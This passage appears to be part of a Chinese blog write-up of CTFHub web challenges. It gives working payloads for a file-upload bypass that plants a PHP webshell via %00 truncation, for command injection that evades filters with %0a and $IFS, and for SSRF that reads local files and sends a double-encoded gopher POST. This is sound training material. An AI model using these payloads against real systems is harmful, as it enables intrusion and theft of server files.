-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>
-        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
-<span class="token comment" spellcheck="true">&lt;!--
-if (!empty($_POST['submit'])) {;
-    $name = basename($_FILES['file']['name']);
-    $info = pathinfo($name);
-    $ext = $info['extension'];
-    $whitelist = array("jpg", "png", "gif");
-    if (in_array($ext, $whitelist)) {;
-        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
-        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {;
-            echo "&lt;script>alert('上传成功')&lt;/script>";
-        }; else {;
-            echo "&lt;script>alert('上传失败')&lt;/script>";
-        };
-    }; else {;
-        echo "文件类型不匹配";
-    };
-};
---></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
-
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
-</code></pre>
-<p>发现里面有一串代码</p>
-<pre class=" language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">,</span> <span class="token string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-        <span class="token variable">$des</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'road'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"/"</span> <span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"."</span> <span class="token punctuation">.</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$des</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传成功')&lt;/script>"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('上传失败')&lt;/script>"</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-        <span class="token keyword">echo</span> <span class="token string">"文件类型不匹配"</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token operator">--</span><span class="token operator">></span>
-</code></pre>
-<p><code>move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)</code>这个函数就是把上传文件放到<code>$des</code>的路径上并且改了文件名</p>
-<p>所以我们不能让后面的<code>rand()</code>和<code>date()</code>运行，所以对于变量<code>road</code>【也就是开始讲到的】，就需要在它后面加上一个<code>%00</code>截断后面的语句</p>
-<p>也就是下面这个请求头后面</p>
-<p><img src="/post/wp-CTFHub/image-20220731233456720.png" alt="image-20220731233456720"></p>
-<p>图片正常上传就可以，这就是把图片内容上传到<code>1.php</code>文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为<code>1.php</code>的一句话木马</p>
-<p>【名字不重要，虽然图片和<code>php</code>文件名一样，这里<code>1.php</code>是随便取得，主要蚁剑连接的就是它】</p>
-<p><img src="/post/wp-CTFHub/image-20220731233716114.png"></p>
-<p>用蚁剑连接<code>url/upload/1.php</code></p>
-<p>得到<code>flag</code></p>
-<h2 id="10-文件上传-双写后缀"><a href="#10-文件上传-双写后缀" class="headerlink" title="10.文件上传-双写后缀"></a>10.文件上传-双写后缀</h2><p>进行了一次过滤php后缀名，双写php为p<u>php</u>hp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接</p>
-<p><img src="/post/wp-CTFHub/image-20220731165549883.png" alt="image-20220731165549883"></p>
-<p><img src="/post/wp-CTFHub/image-20220731165841829.png" alt="image-20220731165841829"></p>
-<p>得到flag</p>
-<h2 id="11-RCE-命令注入-综合训练"><a href="#11-RCE-命令注入-综合训练" class="headerlink" title="11.RCE-命令注入-综合训练"></a>11.RCE-命令注入-综合训练</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-
-<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token constant">FALSE</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-    <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"ping -c 4 {;$ip};"</span><span class="token punctuation">;</span>
-        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p>这道题</p>
-<p>看到<code>|，;，&amp;</code>都被过滤了</p>
-<p>那么可以用<code>%0a</code>也是换行符代替</p>
-<p>空格，&#x2F;，cat，flag，ctfhub（这些好像不大用的上，没关系）</p>
-<p><code>$IFS</code>代替<code>空格</code>，<code>cat</code>可以用<code>more</code>代替，<code>%09</code>代替<code>TAB</code>键，用来补全<code>flag</code></p>
-<p><code>?ip=120.0.0.1%0als</code></p>
-<p><img src="/post/wp-CTFHub/image-20220801215911504.png" alt="image-20220801215911504"></p>
-<p>然后</p>
-<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0als</code></p>
-<p><img src="/post/wp-CTFHub/image-20220801215930160.png" alt="image-20220801215930160"></p>
-<p>后面就简单了</p>
-<p><code>?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php</code></p>
-<p>右键查看源码</p>
-<p>得到<code>flag</code></p>
-<h2 id="12-SSRF-内网访问"><a href="#12-SSRF-内网访问" class="headerlink" title="12.SSRF-内网访问"></a>12.SSRF-内网访问</h2><p><img src="/post/wp-CTFHub/image-20220802103546644.png" alt="image-20220802103546644"></p>
-<p><img src="/post/wp-CTFHub/image-20220802103603770.png" alt="image-20220802103603770"></p>
-<p>所以构造payload</p>
-<p><code>http://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</code></p>
-<p>得到flag</p>
-<h2 id="13-SSRF-伪协议读取文件"><a href="#13-SSRF-伪协议读取文件" class="headerlink" title="13.SSRF-伪协议读取文件"></a>13.SSRF-伪协议读取文件</h2><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>事实上是其支持的协议与封装协议。而其支持的部分协议有：</p>
-<pre><code>    file:// — 访问本地文件系统
-
-    http:// — 访问 HTTP(s) 网址
-
-    ftp:// — 访问 FTP(s) URLs
-
-    php:// — 访问各个输入/输出流(I/O streams)
-</code></pre>
-<p>根据提示，flag在Web目录下，Web目录一般是在<code>/var/www/html/</code>下</p>
-<p><code>http://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</code></p>
-<p>得到flag</p>
-<h2 id="14-SSRF-端口扫描"><a href="#14-SSRF-端口扫描" class="headerlink" title="14.SSRF-端口扫描"></a>14.SSRF-端口扫描</h2><p>端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下</p>
-<p><code>http://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000</code></p>
-<p><img src="/post/wp-CTFHub/image-20220802105640721.png" alt="image-20220802105640721"></p>
-<p>看到长度不同，打开查看响应数据包</p>
-<p>得到flag</p>
-<h2 id="15-SSRF-POST请求"><a href="#15-SSRF-POST请求" class="headerlink" title="15.SSRF-POST请求"></a>15.SSRF-POST请求</h2><p><code>hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</code></p>
-<p>开始是一个空白页面</p>
-<p>网站为</p>
-<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=_
-</code></pre>
-<p>我们在其后面加上<code>127.0.0.1/flag.php</code>看看能不能直接访问该文件</p>
-<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
-</code></pre>
-<p><img src="/post/wp-CTFHub/image-20220925221703912.png" alt="image-20220925221703912"></p>
-<p>发现出现了一个输入框</p>
-<p><code>F12</code>查看源码：</p>
-<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
-    <span class="token comment" spellcheck="true">&lt;!-- Debug: key=11e053e2b7900523ac51fc7606b964e2--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
-</code></pre>
-<p>发现了一个<code>key</code>的参数</p>
-<pre><code>key=11e053e2b7900523ac51fc7606b964e2
-//key是不定的哈，不要全copy
-</code></pre>
-<p>我们把<code>key</code>值输入框中试试</p>
-<p><img src="/post/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></p>
-<p>看来只能从本地<code>127.0.0.1</code>访问</p>
-<p>利用<code>file://</code>伪协议从本地方式访问文件看看<code>index.php</code>文件</p>
-<pre><code>http://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php
-</code></pre>
-<p>右键查看，</p>
-<p>得到<code>index.php</code>源码</p>
-<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
-
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    exit<span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-
-<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>以相同方式看看<code>flag.php</code>文件</p>
-<pre class=" language-php+HTML"><code class="language-php+HTML"><?php
-
-error_reporting(0);
-
-if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {;
-    echo "Just View From 127.0.0.1";
-    return;
-};
-
-$flag=getenv("CTFHUB");
-$key = md5($flag);
-
-if (isset($_POST["key"]) && $_POST["key"] == $key) {;
-    echo $flag;
-    exit;
-};
-?>
-
-<form action="/flag.php" method="post">
-<input type="text" name="key">
-<!-- Debug: key=<?php echo $key;?>-->
-</form>
-</code></pre>
-<p>根据<code>flag.php</code>最后的提示，</p>
-<p>尝试 <code>Gopher</code> 协议向服务器发送 <code>POST</code> 包</p>
-<pre><code> Gopher协议的格式:
- 
- gopher://IP:port/_TCP/IP数据流
-</code></pre>
-<p>先构造 <code>Gopher</code>协议所需的 <code>POST</code>请求：</p>
-<pre><code>POST /flag.php HTTP/1.1
-Host: 127.0.0.1:80
-Content-Length: 36          
-Content-Type: application/x-www-form-urlencoded
-
-key=11e053e2b7900523ac51fc7606b964e2
-
-//Content-Length 这个要和底下POST参数[包括key=,4个]长度一致
-</code></pre>
-<p>但是这里需要对其进行两次<code>url</code>编码</p>
-<p>根据<code>hint</code>，请求有<code>curl</code>功能</p>
-<p>在向服务器发送请求时，首先浏览器会进行一次 <code>URL</code>解码，</p>
-<p>其次服务器收到请求后，在执行<code>curl</code>功能时，进行第二次 <code>URL</code>解码</p>
-<p>因此需要两次<code>url</code>编码</p>
-<pre><code>`注`：
-在第一次编码后的数据中，将`%0A`全部替换为`%0D%0A`。
-
-因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&amp;`等特殊字符，
-避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。
-</code></pre>
-<p><img src="/post/wp-CTFHub/image-20220925231951671.png" alt="image-20220925231951671"></p>
-<p>然后第二次编码</p>
-<p><img src="/post/wp-CTFHub/image-20220925232013164.png" alt="image-20220925232013164"></p>
-<p>得到</p>
-<pre><code>POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2
-</code></pre>
-<p>然后又因为<code>flag.php</code>里有<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
-<p>如果直接在输入框，上传POST请求又会显示</p>
-<p><img src="/post/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></p>
-<p>这个想绕过，就只有通过<code>index.php</code>的<code>curl</code>功能，利用Gopher协议从<code>127.0.0.1</code>向目标发送<code>POST</code>请求</p>
-<pre><code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2
-</code></pre>
-<p><img src="/post/wp-CTFHub/image-20220925232055769.png" alt="image-20220925232055769"></p>
-<p>得到flag</p>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
